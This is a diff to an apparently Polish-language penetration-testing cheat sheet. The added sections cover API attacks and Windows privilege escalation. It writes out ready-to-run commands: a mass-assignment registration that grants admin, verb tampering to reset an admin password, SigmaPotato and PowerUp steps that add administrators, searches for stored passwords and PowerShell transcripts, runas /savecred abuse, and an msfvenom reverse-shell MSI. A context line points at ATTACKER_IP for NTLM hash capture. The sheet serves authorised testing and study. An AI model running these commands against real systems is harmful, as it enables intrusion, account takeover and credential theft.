@@ -13,7 +13,7 @@
 |---|------|------------------|
 | [0](#0-setup--zmienne-robocze) | **Setup** | Zmienne robocze, konwencje |
 | [1](#1-recon--enumeration-rozpoznanie) | **Recon & Enumeration** | Nmap, web, DNS, SMB, SNMP, LDAP, RPC, AD user enum, hydra, vuln scan (NSE/Nessus) |
-| [2](#2-initial-access--exploitation-uzyskanie-dostepu) | **Initial Access / Exploitation** | SQLi, LFI/RFI, upload, cmd injection, SSTI, XSS, SQLMap, reverse shells, TTY, exploity, Metasploit, client-side |
+| [2](#2-initial-access--exploitation-uzyskanie-dostepu) | **Initial Access / Exploitation** | SQLi, LFI/RFI, upload, cmd injection, SSTI, XSS, SQLMap, API, reverse shells, TTY, exploity, Metasploit, client-side |
 | [3](#3-post-exploitation--situational-awareness) | **Situational Awareness** | Rozpoznanie lokalne Linux / Windows |
 | [4](#4-privilege-escalation-eskalacja-uprawnien) | **Privilege Escalation** | Linux (SUID/sudo/cron/caps) i Windows (services/DLL/registry) |
 | [5](#5-credential-access-pozyskiwanie-poswiadczen) | **Credential Access** | John, hashcat, *2john, spraying, mimikatz, Kerberos, Responder, NTLM relay |
@@ -747,6 +747,29 @@ sudo python3 -m http.server 80       # hostuj klon; własny cred_server.py loguj
 ```
 > Wariant bez klonu: wymuś uwierzytelnienie NTLM (odwołanie do `\\ATTACKER_IP\share` w mailu/pliku) i przechwyć hash Responderem (§5.4). Zawsze w granicach zgody klienta.
 
+## 2.15 API attacks (REST / JSON)
+
+> Nowoczesne apki mają backend API (`/api/`, `/v1/`, `/rest/`). Enumeruj endpointy, metody i logikę — częste błędy: **mass-assignment**, brak autoryzacji na endpointach admina, **verb tampering**, IDOR/BOLA.
+
+### Enumeracja
+```bash
+ffuf -u http://$IP:5002/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+curl -i http://$IP:5002/users/v1                 # często zwraca listę userów / strukturę
+curl -i http://$IP:5002/users/v1/admin/password  # sprawdź endpointy „admin”
+```
+### Nadużycia
+```bash
+# Rejestracja z mass-assignment (dopisz sobie rolę admina przez ukryte pole):
+curl -d '{"password":"lab","username":"pwn","email":"pwn@x.com","admin":"True"}' \
+  -H 'Content-Type: application/json' http://$IP:5002/users/v1/register
+# Logowanie → token (użyj w nagłówku Authorization przy kolejnych żądaniach):
+curl -d '{"password":"lab","username":"pwn"}' -H 'Content-Type: application/json' http://$IP:5002/users/v1/login
+# Verb tampering — zmień metodę na PUT/DELETE tam, gdzie GET był chroniony:
+curl -X PUT -d '{"password":"newpass"}' -H 'Content-Type: application/json' \
+  -H 'Authorization: Bearer <JWT>' http://$IP:5002/users/v1/admin/password
+```
+> Sprawdzaj: **IDOR/BOLA** (podmień ID w ścieżce), brak autoryzacji na `/admin/*`, **JWT** (`jwt_tool`, słaby sekret → `hashcat -m 16500`), nadmiarowe pola w JSON. Zawsze `curl -i` — czytaj nagłówki i kody.
+
 ---
 
 # 3. Post-Exploitation — Situational Awareness
@@ -961,6 +984,7 @@ set
 PrintSpoofer64.exe -i -c cmd                            :: Win10/Server 2016-2019
 GodPotato -cmd "cmd /c whoami"                          :: nowsze systemy
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
+.\SigmaPotato "net localgroup Administrators dave4 /add"   :: nowszy fork (in-memory, .NET)
 ```
 
 ### Service hijacking (słabe uprawnienia usług)
@@ -968,6 +992,9 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
 # Sprawdź uprawnienia binarki usługi (czy możesz nadpisać):  icacls "C:\Path\service.exe"
+# Automat (PowerUp): znajdź i nadpisz podatną usługę jednym ruchem:
+#   Import-Module .\PowerUp.ps1 ; Invoke-AllChecks
+#   Install-ServiceBinary -Name 'vulnsvc'      # podmienia binarkę → dodaje admina
 ```
 
 ### Unquoted Service Paths
@@ -1003,6 +1030,31 @@ schtasks /query /fo LIST /v                             :: lista zadań (szukaj 
 schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE /sd 01/01/1970 /st 00:00
 schtasks /s TARGET /run /TN "THMtask1"
 schtasks /S TARGET /TN "THMtask1" /DELETE /F
+```
+
+### Zapisane poświadczenia (hidden in plain view)
+```cmd
+cmdkey /list                                            :: zapisane creds Windows
+runas /savecred /user:admin "cmd /c whoami"             :: użyj zapisanych creds BEZ znajomości hasła
+:: Pliki z hasłami (unattend/sysprep/GPP Groups.xml):
+dir /s /b C:\*unattend.xml C:\*sysprep.xml C:\*Groups.xml 2>nul
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+```
+```powershell
+type C:\Users\Public\Transcripts\*                        # transkrypty PowerShell (jackpot z hasłami)
+(Get-PSReadlineOption).HistorySavePath ; Get-History       # historia PS bieżącej sesji
+Get-ChildItem C:\ -Include *.kdbx,*.config,*.txt -File -Recurse -ErrorAction SilentlyContinue
+```
+
+### AlwaysInstallElevated (dowolny MSI jako SYSTEM)
+```cmd
+:: Jeśli OBA klucze zwrócą 0x1 → każdy MSI instaluje się jako SYSTEM:
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi
+# na celu:  msiexec /quiet /qn /i evil.msi
 ```
 
 ---
